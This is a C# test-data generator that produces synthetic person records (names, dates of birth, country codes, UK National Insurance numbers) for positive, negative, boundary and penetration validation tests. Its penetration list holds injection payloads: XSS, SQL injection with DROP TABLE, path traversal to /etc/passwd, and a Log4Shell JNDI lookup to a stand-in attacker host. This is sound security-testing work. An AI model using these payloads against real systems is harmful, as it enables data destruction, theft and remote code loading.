using DataGenerationUtility.src.TestDataGenerator;
using System.Globalization;
using System.Text;

namespace TestDataGenerator;

public static class TestDataGeneratorUtility
{
    private static readonly Random Random = new();

    private static readonly string[] ValidCountries =
    [
        "GB",
        "US",
        "DE",
        "FR",
        "ES",
        "IT",
        "NL",
        "IE",
        "CA",
        "AU"
    ];

    private static readonly string[] FirstNames =
    [
        "John",
        "Sarah",
        "Michael",
        "Emma",
        "David",
        "James",
        "Olivia",
        "Sophia",
        "Liam",
        "Noah"
    ];

    private static readonly string[] LastNames =
    [
        "Smith",
        "Jones",
        "Williams",
        "Brown",
        "Taylor",
        "Davies",
        "Wilson",
        "Evans"
    ];

    private static readonly string[] PenetrationStrings =
    [
        "<script>alert(1)</script>",
        "' OR 1=1 --",
        "\" OR \"1\"=\"1",
        "../../../etc/passwd",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "'; DROP TABLE Person; --",
        "${jndi:ldap://attacker/poc}"
    ];

    public static IReadOnlyCollection<Person> Generate(
        int rowCount,
        TestDataType type)
    {
        ArgumentOutOfRangeException.ThrowIfNegativeOrZero(rowCount);

        var people = new List<Person>();

        for (var i = 0; i < rowCount; i++)
        {
            people.Add(type switch
            {
                TestDataType.Positive => GeneratePositive(),
                TestDataType.Negative => GenerateNegative(),
                TestDataType.Boundary => GenerateBoundary(),
                TestDataType.Penetration => GeneratePenetration(),
                TestDataType.Mixed => GenerateMixed(),
                _ => throw new ArgumentOutOfRangeException(nameof(type))
            });
        }

        return people;
    }

    private static Person GenerateMixed()
    {
        var values = Enum.GetValues<TestDataType>()
            .Where(x => x != TestDataType.Mixed)
            .ToArray();

        var selected = values[Random.Next(values.Length)];

        return selected switch
        {
            TestDataType.Positive => GeneratePositive(),
            TestDataType.Negative => GenerateNegative(),
            TestDataType.Boundary => GenerateBoundary(),
            TestDataType.Penetration => GeneratePenetration(),
            _ => throw new InvalidOperationException()
        };
    }

    private static Person GeneratePositive()
    {
        return new Person
        {
            FirstName = RandomFirstName(),
            LastName = RandomLastName(),
            DateOfBirth = RandomValidDateOfBirth(),
            Country = RandomCountry(),
            NationalInsuranceNumber = GenerateValidNino(),

            TestDataType = TestDataType.Positive,
            Heuristic = "Valid Data",
            ExpectedToBeValid = true,
            InvalidField = InvalidField.None,
            FailureReason = string.Empty,
            ScenarioDescription = "Fully valid person record"
        };
    }

    private static Person GenerateNegative()
    {
        var scenario = Random.Next(6);

        return scenario switch
        {
            0 => new Person
            {
                FirstName = "",
                LastName = RandomLastName(),
                DateOfBirth = RandomValidDateOfBirth(),
                Country = RandomCountry(),
                NationalInsuranceNumber = GenerateValidNino(),

                TestDataType = TestDataType.Negative,
                ExpectedToBeValid = false,
                InvalidField = InvalidField.FirstName,
                FailureReason = "Mandatory field empty"
            },

            1 => new Person
            {
                FirstName = RandomFirstName(),
                LastName = "",
                DateOfBirth = RandomValidDateOfBirth(),
                Country = RandomCountry(),
                NationalInsuranceNumber = GenerateValidNino(),

                TestDataType = TestDataType.Negative,
                ExpectedToBeValid = false,
                InvalidField = InvalidField.LastName,
                FailureReason = "Mandatory field empty"
            },

            2 => new Person
            {
                FirstName = RandomFirstName(),
                LastName = RandomLastName(),
                DateOfBirth = "31/12/1985",

                Country = RandomCountry(),
                NationalInsuranceNumber = GenerateValidNino(),

                TestDataType = TestDataType.Negative,
                ExpectedToBeValid = false,
                InvalidField = InvalidField.DateOfBirth,
                FailureReason = "Invalid format"
            },

            3 => new Person
            {
                FirstName = RandomFirstName(),
                LastName = RandomLastName(),
                DateOfBirth = "1985-02-30",

                Country = RandomCountry(),
                NationalInsuranceNumber = GenerateValidNino(),

                TestDataType = TestDataType.Negative,
                ExpectedToBeValid = false,
                InvalidField = InvalidField.DateOfBirth,
                FailureReason = "Impossible date"
            },

            4 => new Person
            {
                FirstName = RandomFirstName(),
                LastName = RandomLastName(),
                DateOfBirth = RandomValidDateOfBirth(),

                Country = "ZZZ",
                NationalInsuranceNumber = GenerateValidNino(),

                TestDataType = TestDataType.Negative,
                ExpectedToBeValid = false,
                InvalidField = InvalidField.Country,
                FailureReason = "Invalid ISO country code"
            },

            _ => new Person
            {
                FirstName = RandomFirstName(),
                LastName = RandomLastName(),
                DateOfBirth = RandomValidDateOfBirth(),

                Country = RandomCountry(),
                NationalInsuranceNumber = "123456",

                TestDataType = TestDataType.Negative,
                ExpectedToBeValid = false,
                InvalidField = InvalidField.NationalInsuranceNumber,
                FailureReason = "Invalid NINO format"
            }
        };
    }

    private static Person GenerateBoundary()
    {
        var scenario = Random.Next(6);

        return scenario switch
        {
            0 => CreateBoundaryPerson(1, 1),
            1 => CreateBoundaryPerson(50, 50),
            2 => CreateBoundaryPerson(1, 50),
            3 => CreateBoundaryPerson(50, 1),
            4 => CreateBoundaryPerson(49, 49),
            _ => CreateBoundaryPerson(51, 51)
        };
    }

    private static Person GeneratePenetration()
    {
        return new Person
        {
            FirstName = PenetrationStrings[Random.Next(PenetrationStrings.Length)],
            LastName = PenetrationStrings[Random.Next(PenetrationStrings.Length)],
            DateOfBirth = RandomValidDateOfBirth(),
            Country = RandomCountry(),
            NationalInsuranceNumber = GenerateValidNino(),
            TestDataType = TestDataType.Penetration
        };
    }

    private static Person CreateBoundaryPerson(
        int firstNameLength,
        int lastNameLength)
    {
        return new Person
        {
            FirstName = RandomString(firstNameLength),
            LastName = RandomString(lastNameLength),

            DateOfBirth = "1900-01-01",

            Country = RandomCountry(),
            NationalInsuranceNumber = GenerateValidNino(),

            TestDataType = TestDataType.Boundary,
            Heuristic = "Boundary Analysis",

            ExpectedToBeValid = firstNameLength <= 50 &&
                                lastNameLength <= 50,

            InvalidField = firstNameLength > 50 ||
                           lastNameLength > 50
                ? InvalidField.Multiple
                : InvalidField.None,

            FailureReason = firstNameLength > 50 ||
                            lastNameLength > 50
                ? "Exceeded maximum length"
                : string.Empty,

            ScenarioDescription =
                $"Boundary test FN={firstNameLength}, LN={lastNameLength}"
        };
    }

    private static string RandomFirstName()
        => FirstNames[Random.Next(FirstNames.Length)];

    private static string RandomLastName()
        => LastNames[Random.Next(LastNames.Length)];

    private static string RandomCountry()
        => ValidCountries[Random.Next(ValidCountries.Length)];

    private static string RandomValidDateOfBirth()
    {
        var start = new DateTime(1900, 1, 1);
        var end = DateTime.Today.AddYears(-16);

        var days = (end - start).Days;

        return start
            .AddDays(Random.Next(days))
            .ToString("yyyy-MM-dd");
    }

    private static string GenerateValidNino()
    {
        const string letters = "ABCEGHJKLMNPRSTWXYZ";
        const string suffixes = "ABCD";

        return
            $"{letters[Random.Next(letters.Length)]}" +
            $"{letters[Random.Next(letters.Length)]}" +
            $"{Random.Next(0, 999999):000000}" +
            $"{suffixes[Random.Next(suffixes.Length)]}";
    }

    private static string RandomString(int length)
    {
        const string chars =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

        var builder = new StringBuilder();

        for (var i = 0; i < length; i++)
        {
            builder.Append(chars[Random.Next(chars.Length)]);
        }

        return builder.ToString();
    }
}